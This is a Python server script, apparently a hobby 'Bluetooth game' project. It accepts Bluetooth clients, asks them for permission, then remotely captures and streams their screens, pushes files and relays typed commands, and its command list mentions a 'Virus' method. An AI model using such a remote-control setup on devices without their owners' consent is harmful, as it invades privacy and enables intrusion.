import socket
from PIL import Image, ImageTk
import keyboard
from time import sleep
from ShellUi import Simage,Line,newLine,window,clear,createLabel
import threading

text = ""
numclients = 1


while window.winfo_exists():
    Line("Set the number of clients: "+text)
    key = keyboard.read_key()

    if key == 'enter':
        newLine()
        if text.isdigit():
            numclients = int(text)
            break
        else:
            Line("\""+text+"\" is not a integer",True)
            text = ""
    elif key == "backspace":
        text = text[0:len(text)-1]
    elif key != "":
        text += key
    sleep(.12)
Line("----------------------------",True)
Line("Starting Server",True)
Line("----------------",True)

connected = []
server = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
server.bind(("6c:2f:80:71:84:8b", 4))
server.listen(1)

# Checks for any clients that want to connect
while len(connected) < numclients:
    client, addr = server.accept()
    hn = client.recv(1024)
    connected.append([client,addr,hn.decode(),"None"])
    Line(hn.decode()+" has connected with address "+addr[0],True)
Line("Max amount of clients, entering shell",True)
Line("----------------------------",True)

# Sends any commands to all clients that are connected
def SendToClients(mess:str,isFile = False):
    for cl,_,_,ac in connected:
        if ac == True:
            if isFile:
                split = mess.split("/")
                cl.sendfile(open(mess,"rb"))
                cl.send(str("img").encode())
            else:
                cl.send(mess.encode())

# asks all the clients if we are allowed to conneect
def connect():
    for cl,_,_,_ in connected:
        cl.send(str("1").encode())
    
    for p in range(len(connected)):
        cl,_,hn,_ = connected[p]
        data = cl.recv(1024)
        if not data:
            connected[p][3] = "Ded"
            Line(hn+" has lost connection",True)
        else:
            connected[p][3] = data.decode() == "yes"
            Line(hn+" connection status: "+str(connected[p][3]),True)


# asks the sever to pick a client
def PAC():
    allowed = []
    picked = None
    text = ""

    for i in range(len(connected)):
        if connected[i][3] == True:
            Line(str(len(allowed))+". "+connected[i][2],True)
            allowed.append(connected[i])

    while True:
        Line("Answer: "+text)
        key = keyboard.read_key()

        if key == 'enter':
            newLine()

            if text == "end":
                break
            else: 
                try:
                    num = int(text)
                    if num > -1 and num < len(allowed):
                        picked = allowed[num]
                        break
                except Exception as e:
                    pass
                text = ""
                Line("Not a option",True)
                for i in range(len(allowed)):
                    Line(str(i)+". "+allowed[i][2],True)
        elif key in ["shift","ctrl","alt"]:
            continue

        elif key == "backspace":
            text = text[0:len(text)-1]

        elif key == "space":
            text += " "

        elif key != "":
            text += key

        sleep(.12)
    return picked


# asks all connected clients to take a screenshot and send it back
savedimgs = []
def Screenshot():
    image = b''
    clidata = PAC()

    if clidata == None:
        return
    
    clidata[0].send("3".encode())
    while True:
        data = clidata[0].recv(99999)
        if not data:
            break

        try:
            data = data.decode()
        except Exception as e:
            image += data
            continue

        if data == "end":
            break
    
    clear()
    with open("screen.png","wb") as img:
        img.write(image)
    img = Image.open("screen.png")
    img = img.resize((720 , 480))
    img = ImageTk.PhotoImage(img)
    savedimgs.append(img)
    Simage(img)

# View a client screen updateing
cli = threading.Thread()
stopwatch = False
def SCS(cl=None,a="",h="",al=""):
    screen = createLabel()
    screen.config(anchor="e",justify="right")
    screen.pack(side="right")
    lab = createLabel(screen)
    lab.config(text=h)
    lab.place(x=0,y=0)
    
    if cl == None:
        return
    img = None
    clear()
    while not stopwatch:
        cl.send("3".encode())
        image = b''
        while True:
            data = cl.recv(99999)
            if not data:
                break

            try:
                data = data.decode()
            except Exception as e:
                image += data
                continue

            if data == "end":
                break
            
        with open("screen.png","wb") as img:
            img.write(image)
        img = Image.open("screen.png")
        img = img.resize((720 , 480))
        img = ImageTk.PhotoImage(img)
        screen.config(image = img) 
        sleep(.3)
    screen.destroy()
    Line("Stoped watching "+str(h),True)


targetsite = "gnu.org"

#COMMAND LIST 
commands = {
    1: "Asks all connected clients if we are allowed to ne fully connected",
    2: "Tells all fully connected clients to turn the \"Virus\" method",
    3: "Tells all fully connected client to take a screenshot and send it back",
    4: "Tells a fully connected client to send there current screen",
    "4s":"Stops viewing a client screen updateing",
    "img": "Sends a image",
    "status": "Prints the connected client statuses",
    "end": "Stops the current task",
    "fs":"Shuts down all clients"
}

mktest = "mkdir test"

pinga = ("ping",targetsite)



text = ""
Line("Type \"?\" for commands",True)
try:
    while True:
        Line("Command: "+text)
        key = keyboard.read_key()

        if key == 'enter':
            newLine()
            if text == "end":
                break
            elif text == "fs": # Sedns all clients the full shutdown protocall
                for c,_,_,_ in connected:
                    c.send("fs".encode())

            elif text == "1": # Connect
                connect() 
            elif text == "3": # Screenshot
                Screenshot()
            elif text == "4": # Screencapture
                cli = threading.Thread(target=SCS,args=(PAC()),daemon=True)
                cli.start()
            elif text == "4s": # Screencapture
                stopwatch = True
            
            elif text == "test":
                SendToClients("cmdmode")
                SendToClients(mktest)
            elif text == "img":
                SendToClients("C:/Users/jaypa/OneDrive/Documents/GitHub/Bluetooth-game/Server/testimg.png",True)
            elif text == "status":
                for _,add,hn,ac in [["",("Address",4),"Host name","Allowed"]]+connected:
                    print(add,hn,ac)
                    Line(str(hn)+" | "+str(add[0])+" | "+str(ac),True)
            else:
                SendToClients(text)
            text = ""

        elif key in ["shift","ctrl","alt"]:
            continue

        elif key == "?":
            Line("-----------",True)
            for c,d in commands.items():
                Line(str(c)+": "+d,True)
            Line("-----------",True)

        elif key == "backspace":
            text = text[0:len(text)-1]

        elif key == "space":
            text += " "

        elif key != "":
            text += key

        sleep(.12)
except OSError as e:
    pass

server.close()
if window.winfo_exists():
    window.quit()